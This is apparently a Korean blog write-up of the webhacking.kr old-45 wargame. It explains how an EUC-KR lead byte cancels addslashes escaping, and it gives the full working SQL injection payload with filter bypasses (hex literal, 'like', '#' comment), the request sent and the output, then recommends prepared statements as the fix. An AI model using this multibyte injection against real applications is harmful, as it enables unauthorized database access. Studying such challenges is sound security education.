---
title: "webhacking.kr old-45 풀이 — addslashes를 먹어 치우는 멀티바이트(EUC-KR) SQL 인젝션"
description: "webhacking.kr old-45를 통해 addslashes가 붙인 역슬래시를 mb_convert_encoding(euc-kr)의 선행 바이트가 삼켜 따옴표가 되살아나는 멀티바이트 SQL 인젝션, 그리고 admin·=·따옴표 금지 필터를 16진수와 like·주석으로 우회하는 과정을 직접 풀어 정리한다."
date: 2026-11-02
category: Web
tags: [webhacking.kr, web, wargame, sql-injection, multibyte, charset, php, mysql]
---

[webhacking.kr](https://webhacking.kr)의 **old-45** 문제를 풀었다.
`addslashes`로 따옴표를 막는 평범해 보이는 로그인인데, 바로 다음 줄의
**`mb_convert_encoding($id, 'utf-8', 'euc-kr')`** 가 모든 걸 뒤집는다.
핵심은 **`addslashes`가 따옴표 앞에 붙인 역슬래시(`\`)를,
EUC-KR 멀티바이트 문자의 "선행 바이트"가 삼켜 버려 따옴표가 되살아난다**는 점이다.
이른바 **멀티바이트(문자셋) SQL 인젝션**이다.

따옴표를 되살린 뒤에는, `admin`·`=`·따옴표를 막는 필터를 **16진수 리터럴·`like`·주석(`#`)**
으로 넘겨 `admin` 행을 끌어온다.
아래 내용은 전부 **실제로 서버에 넣어 통과를 확인한 것**이다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-45 (`/challenge/web-22/`) |
| 유형 | SQL 인젝션 / 멀티바이트(문자셋) 우회 |
| 배점 | 55점 |
| 목표 | 질의 결과 `id`가 **`admin`** 이 되도록 만들어 통과(`solve(45)`) |

페이지는 `id`/`pw` 입력이 있는 로그인 폼이다. 아무 값이나 넣으면 **`Wrong`** 이 뜬다.

## 2. 정보 수집 — 소스 코드

하단 `view-source`로 전체 로직이 공개된다.

```php
<?php
  if($_GET['id'] && $_GET['pw']){
    $db = dbconnect();
    $_GET['id'] = addslashes($_GET['id']);                        // (1) 따옴표 이스케이프
    $_GET['pw'] = addslashes($_GET['pw']);
    $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr'); // (2) id만 인코딩 변환
    if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['id'])) exit();  // (3) 필터
    if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['pw'])) exit();
    $result = mysqli_fetch_array(mysqli_query($db,
      "select id from chall45 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
    if($result){
      echo "hi {$result['id']}";
      if($result['id'] == "admin") solve(45);   // id가 admin이면 통과
    }
    else echo("Wrong");
  }
?>
```

처리 순서가 결정적이다.

1. **(1) `addslashes`** : `'` → `\'` 로 바꿔 따옴표를 무력화한다.
2. **(2) `mb_convert_encoding(..,'utf-8','euc-kr')`** : `id`를 **EUC-KR로 해석해 UTF-8로 변환**한다.
3. **(3) 필터** : `id`·`pw`에 `admin`·`select`·`limit`·`pw`·`=`·`<`·`>` 가 있으면 종료.
   (공백·`(`·`)`·`'`·`or`·`like`·콤마·`#`·16진수는 **막지 않는다**.)

## 3. 문제점 — 역슬래시를 먹어 치우는 멀티바이트 변환

`addslashes`는 따옴표 앞에 `\`(0x5C)를 붙여 `\'`(바이트 `5C 27`)로 만든다.
그래서 **보통은** 따옴표로 질의를 깨뜨릴 수 없다.

그런데 그 **직후에** `id`를 **EUC-KR → UTF-8**로 변환한다.
EUC-KR은 **2바이트 문자**를 쓰는 인코딩이라, `0xA1`~`0xFE` 범위의 바이트는
"선행 바이트(lead byte)"로 취급돼 **바로 뒤 1바이트와 묶여 한 글자**로 해석된다.

입력을 `0xA1` + `'` 로 주면 과정이 이렇게 흘러간다.

| 단계 | 바이트열 | 설명 |
| --- | --- | --- |
| 입력 | `A1 27` | `0xA1` + `'` |
| (1) addslashes | `A1 5C 27` | `'` 앞에 `\`(0x5C) 삽입 |
| (2) mb_convert | `<한 글자> 27` | `A1 5C`를 **한 EUC-KR 문자로 변환하며 0x5C(`\`)를 삼킴** |

결과적으로 **역슬래시가 사라지고 따옴표(`'`)만 살아남는다.**
`addslashes`가 공들여 붙인 방어가, 바로 다음 줄의 인코딩 변환 때문에 **무효화**되는 것이다.

## 4. 익스플로잇 — 따옴표 되살리기 + 필터 우회

따옴표가 되살아나면, 목표는 **`id`가 `admin`인 행을 반환**시키는 것이다.
하지만 필터가 `admin`·`=`·`select`·따옴표를 막으므로, 다음 세 가지 대체 문법을 쓴다.

- **`'admin'` → `0x61646d696e`** : `admin` 글자와 따옴표를 피하는 **16진수 문자열 리터럴**.
- **`=` → `like`** : 등호 대신 `like`로 비교(필터에 `like` 없음).
- **뒤쪽 `and pw=md5('...')` → `#`로 주석 처리** : 남은 질의를 통째로 잘라낸다.

조립한 페이로드(선행 바이트는 `0xA1` 사용):

```text
id = %A1' or id like 0x61646d696e#        (pw 는 아무 값, 예: x)
```

변환·이스케이프를 거친 뒤 실제 질의는 이렇게 된다.

```sql
select id from chall45 where id='<한글자>' or id like 0x61646d696e#' and pw=md5('x')
```

- `%A1'` → (addslashes+변환) → `<한글자>'` 로 **따옴표가 열린 문자열을 닫고 빠져나온다.**
- `or id like 0x61646d696e` → `or id LIKE 'admin'` → **admin 행을 매칭.**
- `#` → 뒤의 `' and pw=md5('x')` 를 **주석으로 제거** → 문법 깨짐 없이 마무리.

필터 점검: 변환 후 `id` 문자열에 `admin`·`select`·`limit`·`pw`·`=`·`<`·`>` **어느 것도 없다**
(`admin`은 16진수로, `=`는 `like`로 대체했기 때문).

### 실제 전송과 결과

```console
GET /challenge/web-22/?id=%A1' or id like 0x61646d696e#&pw=x
→ hi admin
→ old-45 Pwned. You got 55point. Congratz!
```

> 선행 바이트는 `0xA1`이 바로 통했다. 만약 특정 바이트에서 변환이 다르게 동작하면
> `0xA1`~`0xFE`를 훑어 **역슬래시를 삼키는 바이트**를 찾으면 된다(동작은 서버의 인코딩 처리에 달려 있다).

## 5. 결과

결과 `id`가 `admin`으로 돌아와 `solve(45)`가 호출되고 통과했다.

```
hi admin
old-45 Pwned. You got 55point. Congratz!
```

문제 목록(`chall.php`)에서도 **`✔️ old-45`** 로 풀린 것을 확인했다.

> `addslashes`는 분명히 따옴표를 막았다. 그런데도 뚫린 이유는 **그 방어가 인코딩 변환보다 "먼저" 일어났기** 때문이다.
> 변환이 `\`를 삼키는 순간, 이스케이프는 흔적도 없이 사라졌다.

## 6. 왜 취약한가 — 그리고 올바른 방어

**(1) `addslashes` + 문자셋 변환은 멀티바이트 인젝션의 교과서적 조합이다.**
이스케이프 "후"에 인코딩을 바꾸면, 선행 바이트가 역슬래시를 흡수해 이스케이프가 무효화된다.
문자열 치환식 방어(`addslashes`/수동 이스케이프)는 **문자셋이 끼면 신뢰할 수 없다.**

**(2) 근본 해법은 역시 파라미터 바인딩 + 올바른 커넥션 문자셋.**

```php
// 나쁨: addslashes로 막고, 그 뒤 인코딩을 바꾼다
$id = addslashes($_GET['id']);
$id = mb_convert_encoding($id, 'utf-8', 'euc-kr');
$q  = "select id from chall45 where id='{$id}' and pw=md5('{$pw}')";

// 좋음: 커넥션 문자셋을 명시하고, 값은 바인딩으로만 넣는다
$db->set_charset('utf8mb4');
$stmt = $db->prepare("select id from chall45 where id=? and pw=md5(?)");
$stmt->bind_param("ss", $_GET['id'], $_GET['pw']);  // 이스케이프를 직접 조립하지 않음
$stmt->execute();
```

**(3) 블랙리스트는 여기서도 무력하다.**
`admin`·`=`을 막아도 **16진수·`like`·주석**으로 우회된다.
막을 토큰을 늘리는 대신, **입력을 질의 구조에서 분리**해야 한다.

## 7. 정리

- old-45는 `addslashes` **직후** `mb_convert_encoding(euc-kr)`를 돌려, **선행 바이트(`0xA1`)가 역슬래시를 삼켜 따옴표가 되살아나는** 멀티바이트 SQL 인젝션이다.
- 따옴표를 되살린 뒤, `admin`·`=`·따옴표 필터를 **16진수(`0x61646d696e`)·`like`·주석(`#`)** 으로 넘겨 `admin` 행을 반환시킨다 → `id=%A1' or id like 0x61646d696e#`.
- 교훈: **이스케이프 후 문자셋 변환은 금물**, 방어는 **커넥션 문자셋 명시 + 파라미터 바인딩**, 그리고 **블랙리스트 대신 입력·구조 분리**.

> "따옴표를 이스케이프했는가"가 아니라 "그 이스케이프가 **문자셋 변환 뒤에도 살아 있는가**"를 먼저 묻는다.
